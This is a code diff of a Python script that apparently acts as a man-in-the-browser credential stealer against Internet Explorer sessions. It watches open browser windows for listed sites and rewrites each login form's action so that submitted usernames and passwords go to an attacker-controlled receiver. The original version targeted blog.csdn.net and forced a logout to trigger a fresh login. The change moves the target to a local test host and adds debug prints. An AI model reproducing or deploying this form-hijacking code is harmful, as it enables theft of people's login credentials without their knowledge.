@@ -4,8 +4,8 @@ from requests.utils import quote
 from urllib import parse
 
 data_receiver = "http://localhost:8080/"
-target_sites = {"blog.csdn.net": {
-    "logout_url": "https://passport.csdn.net/account/logout",
+target_sites = {"localhost:8000": {
+    "logout_url": None,
     "logout_form": None,
     "login_form_index": 0,
     "owned": False},
@@ -20,7 +20,10 @@ def wait_for_browser(browser):
 
 
 while True:
+    print("hello")
+    print(type(windows))
     for browser in windows:
+        print("world")
         url = parse.urlparse(browser.LocationUrl)
         if url.hostname in target_sites:
             if target_sites[url.hostname]["owned"]:
@@ -37,15 +40,12 @@ while True:
                             wait_for_browser()
                     except Exception as e:
                         print(e)
-            try:
-                login_index = target_sites[url.hostname]["login_form_index"]
-                login_page = quote(browser.LocationUrl)
-                browser.Document.forms[login_index].action = "%s%s"%(data_receiver,login_page)
-                target_sites[url.hostname]["owned"] = True
-            except Exception as e:
-                print(e)
+        try:
+            login_index = target_sites[url.hostname]["login_form_index"]
+            login_page = quote(browser.LocationUrl)
+            browser.Document.forms[login_index].action = "%s%s"%(data_receiver,login_page)
+            print(browser.Document.forms[login_index].action)
+            target_sites[url.hostname]["owned"] = True
+        except Exception as e:
+            print(e)
     time.sleep(5)
-
-
-
-
